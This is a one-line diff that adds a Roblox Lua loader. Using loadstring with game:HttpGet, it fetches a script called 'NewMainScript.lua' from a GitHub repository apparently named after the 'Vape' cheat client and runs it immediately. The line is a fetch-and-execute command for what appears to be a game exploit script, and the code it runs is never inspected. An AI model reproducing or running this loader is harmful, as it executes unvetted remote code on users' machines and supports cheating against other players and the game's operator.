@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UnknowninglyMC/OldVapeForRB/main/NewMainScript.lua", true))()
